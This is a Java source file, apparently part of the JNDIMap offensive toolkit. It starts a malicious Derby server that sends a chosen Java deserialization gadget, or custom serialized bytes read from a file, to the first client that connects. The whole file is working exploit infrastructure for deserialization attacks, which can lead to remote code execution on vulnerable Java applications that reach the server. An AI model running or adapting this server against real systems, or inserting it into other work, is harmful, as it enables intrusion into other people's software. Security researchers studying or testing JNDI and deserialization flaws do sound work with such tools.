package map.jndi.server;

import map.jndi.Dispatcher;

import java.net.ServerSocket;
import java.net.Socket;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.concurrent.TimeUnit;

public class DerbyServer {
    public static int port = 4851;
    public static String gadget;
    public static String filePath;

    public static void main(String[] args) throws Exception {
        // 解析命令行参数
        for (int i = 0; i < args.length; i ++ ) {
            switch (args[i]) {
                case "-h":
                    System.out.println("Usage: java -cp JNDIMap.jar map.jndi.server.DerbyServer [-p <port>] [-g <gadget>] [-f <file>] [-h]");
                    return;
                case "-p":
                    port = Integer.parseInt(args[i + 1]);
                    break;
                case "-g":
                    gadget = args[i + 1];
                    break;
                case "-f":
                    filePath = args[i + 1];
                    break;
            }
        }

        byte[] data;

        if (gadget != null) {
            // 获取内置 gadget
            if (gadget.charAt(0) != '/') {
                gadget = "/" + gadget;
            }
            data = (byte[]) Dispatcher.getInstance().service("/Deserialize" + gadget);
        } else if (filePath != null) {
            // 从文件中读取自定义序列化数据
            data = Files.readAllBytes(Paths.get(filePath));
        } else {
            System.out.println("gadget or file must be specified");
            return;
        }

        // 启动 Derby Server
        System.out.println("[Derby] Listening on " + port);
        try (ServerSocket server = new ServerSocket(port)) {
            try (Socket socket = server.accept()) {
                System.out.println("[Derby] Connection from " + socket.getRemoteSocketAddress().toString().split("/")[1]);
                socket.getOutputStream().write(data);
                socket.getOutputStream().flush();
                Thread.sleep(TimeUnit.SECONDS.toMillis(5));
            }
        }
    }
}
